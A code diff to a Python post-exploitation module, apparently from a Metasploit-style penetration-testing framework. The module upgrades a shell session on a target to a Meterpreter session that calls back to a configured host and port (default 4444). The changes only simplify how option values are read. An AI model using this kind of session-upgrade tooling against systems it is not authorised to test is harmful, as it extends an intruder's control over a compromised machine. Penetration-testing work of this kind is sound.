@@ -35,10 +35,10 @@ class Module(Post):
     lport = OptPort(4444, "Callback port for the new Meterpreter session", True)
 
     def _get_session_id_value(self) -> str:
-        value = getattr(self, "session_id", "") or ""
-        if hasattr(value, "value"):
-            value = value.value
-        return str(value or "").strip()
+        try:
+            return str(getattr(self, "session_id", "") or "").strip()
+        except Exception:
+            return ""
 
     def _is_shell_session(self) -> bool:
         sid = self._get_session_id_value()
@@ -156,8 +156,8 @@ class Module(Post):
             if not PayloadClass:
                 raise ProcedureError(FailureType.Unknown, "Payload module has no Module class")
             payload = PayloadClass(framework=self.framework)
-            lhost_val = self.lhost.value if hasattr(self.lhost, "value") else str(self.lhost)
-            lport_val = int(self.lport.value if hasattr(self.lport, "value") else self.lport)
+            lhost_val = str(self.lhost)
+            lport_val = int(self.lport)
             payload.set_option("lhost", lhost_val)
             payload.set_option("lport", lport_val)
             payload.set_option("python_binary", python_binary)
@@ -199,8 +199,8 @@ class Module(Post):
                     "This module requires a shell session. Use 'sessions' to list and select one.",
                 )
 
-            lhost_val = self.lhost.value if hasattr(self.lhost, "value") else str(self.lhost)
-            lport_val = int(self.lport.value if hasattr(self.lport, "value") else self.lport)
+            lhost_val = str(self.lhost)
+            lport_val = int(self.lport)
 
             print_status("Upgrading shell to Meterpreter...")
             print_info(f"Callback: {lhost_val}:{lport_val}")
